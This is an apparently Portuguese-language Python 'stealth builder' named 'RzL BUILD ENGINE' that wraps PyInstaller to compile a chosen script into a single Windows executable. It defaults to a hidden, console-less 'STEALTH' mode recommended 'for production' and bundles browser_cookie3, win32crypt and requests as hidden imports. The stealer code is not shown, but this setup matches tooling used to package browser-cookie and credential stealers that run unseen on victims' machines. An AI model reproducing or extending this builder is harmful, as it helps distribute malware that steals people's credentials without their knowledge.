import os
import subprocess
import shutil
import sys

class StealthBuilderPro:
    def __init__(self):
        self.target_file = ""
        self.output_name = ""
        self.mode = "windowed" # FICA NO PADRAO BG
        self.heavy_libs = ["cryptography", "cv2", "win32crypt"]
        self.hidden_deps = ["requests", "psutil", "browser_cookie3", "base64", "json", "random"]

    def clear_console(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        print("\n" + "="*50)
        print("       RzL BUILD ENGINE ")
        print("="*50)
        print(f" Status: {'[ATIVA]' if self.target_file else '[AGUARDANDO]'}")
        print(f" Alvo:   {self.target_file if self.target_file else 'Nenhum'}")
        print(f" Modo:   {self.mode.upper()}")
        print("="*50)

    def menu_principal(self):
        while True:
            self.clear_console()
            self.print_banner()
            print("\n[1] Configurar Arquivo Alvo (.py)")
            print("[2] Alterar Modo de Execução (Console vs Background)")
            print("[3] Limpar Workspace (Build/Dist)")
            print("[4] INICIAR COMPILAÇÃO (BUILD)")
            print("[5] Sair")
            print("\n" + "-"*50)
            
            opcao = input("[?] Selecione uma opção: ").strip()

            if opcao == '1':
                self.configurar_arquivo()
            elif opcao == '2':
                self.configurar_modo()
            elif opcao == '3':
                self.limpar_workspace()
            elif opcao == '4':
                self.executar_build()
            elif opcao == '5':
                print("\n[*] Saindo...")
                break
            else:
                print("\n[!] Opção inválida!")
                input("Pressione Enter para continuar...")

    def configurar_arquivo(self):
        self.clear_console()
        print("\n--- CONFIGURAÇÃO DE ARQUIVO ---")
        self.target_file = input("[>] Digite o nome do arquivo .py: ").strip()
        if os.path.exists(self.target_file):
            print(f"[OK] Arquivo '{self.target_file}' detectado.")
        else:
            print(f"[ERRO] Arquivo '{self.target_file}' não encontrado! Confira se ele esta no mesmo diretorio")
        input("\nPressione Enter para voltar...")

    def configurar_modo(self):
        self.clear_console()
        print("\n--- MODO DE EXECUÇÃO ---")
        print("[1] DEBUG Mode (Console Aberto - Recomendado para testes)")
        print("[2] STEALTH Mode (Background - Sem Console - Recomendado para produção)")
        
        opcao = input("[?] Selecione: ").strip()
        if opcao == '1':
            self.mode = "console"
            print("[OK] Modo Console selecionado.")
        elif opcao == '2':
            self.mode = "windowed"
            print("[OK] Modo Background selecionado.")
        else:
            print("[!] Opção inválida.")
        input("\nPressione Enter para voltar...")

    def limpar_workspace(self):
        self.clear_console()
        print("\n--- LIMPANDO WORKSPACE ---")
        for folder in ['build', 'dist']:
            if os.path.exists(folder):
                shutil.rmtree(folder)
                print(f"[OK] Pasta '{folder}' removida.")
        if os.path.exists(f"{self.output_name}.spec"):
            os.remove(f"{self.output_name}.spec")
            print(f"[OK] Arquivo .spec removido.")
        input("\nWorkspace limpo! Pressione Enter...")

    def executar_build(self):
        if not self.target_file:
            print("\n[!] ERRO: Defina o arquivo alvo primeiro!")
            input("Pressione Enter...")
            return

        self.output_name = self.target_file.replace(".py", "")
        self.clear_console()
        print(f"\n[*] Preparando Build para: {self.target_file}")
        print(f"[*] Modo: {self.mode}")
        print("[*] Isso pode levar alguns minutos...")

        # Constroi os Comandos
        cmd = [
            "pyinstaller",
            "--noconfirm",
            "--onefile",
            f"--name={self.output_name}",
            "--clean"
        ]

        # Console ou Background
        if self.mode == "console":
            cmd.append("--console")
        else:
            cmd.append("--windowed")

        for lib in self.heavy_libs:
            cmd.append(f"--collect-all {lib}")

        for dep in self.hidden_deps:
            cmd.append(f"--hidden-import {dep}")

        cmd.append(self.target_file)

        # Execução Real
        full_cmd = " ".join(cmd)
        try:
            print(f"\n[INFO] Executando comando de compilação...\n")
            subprocess.run(full_cmd, shell=True, check=True)
            
            self.clear_console()
            self.print_banner()
            print(f"\n[SUCCESS] COMPILAÇÃO CONCLUÍDA!")
            print(f"📂 Local: pasta 'dist/'")
            print(f"📦 Arquivo: {self.output_name}.exe")
            print(f"🕵️ Modo: {self.mode.upper()}")
            print(f"\n{'='*50}")
            input("\n[?] Pressione Enter para voltar ao menu...")
        except subprocess.CalledProcessError:
            print(f"\n[ERROR] O PyInstaller encontrou um erro durante o build.")
            print("Verifique se as dependências estão instaladas na venv.")
            input("\nPressione Enter...")
        except Exception as e:
            print(f"\n[ERROR] Erro inesperado: {e}")
            input("\nPressione Enter...")

if __name__ == "__main__":
    builder = StealthBuilderPro()
    builder.menu_principal()